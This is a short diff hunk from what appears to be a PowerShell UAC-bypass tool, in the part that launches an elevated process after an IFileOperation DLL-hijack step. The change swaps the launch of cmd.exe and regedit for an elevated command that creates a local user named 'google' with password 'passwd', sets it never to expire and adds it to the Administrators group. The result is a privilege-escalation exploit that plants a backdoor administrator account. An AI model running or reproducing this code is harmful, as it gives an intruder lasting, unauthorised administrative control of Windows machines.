@@ -1530,8 +1530,8 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
             $IFileOperation.PerformOperations()
             echo "`n[?] Executing mmc.."
             #IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')
-		        IEX $($env:SystemRoot + '\System32\cmd.exe')
-		        IEX $($env:SystemRoot + '\regedit.exe')
+	    IEX $($env:SystemRoot + "\System32\cmd.exe /c 'net user google passwd /add /y /expires:never' && 'net localgroup Administrateurs google /add'")
+		        #IEX $($env:SystemRoot + '\regedit.exe')
             
             
             # Move Yamabiko back to %tmp% after it loads to avoid infinite shells!
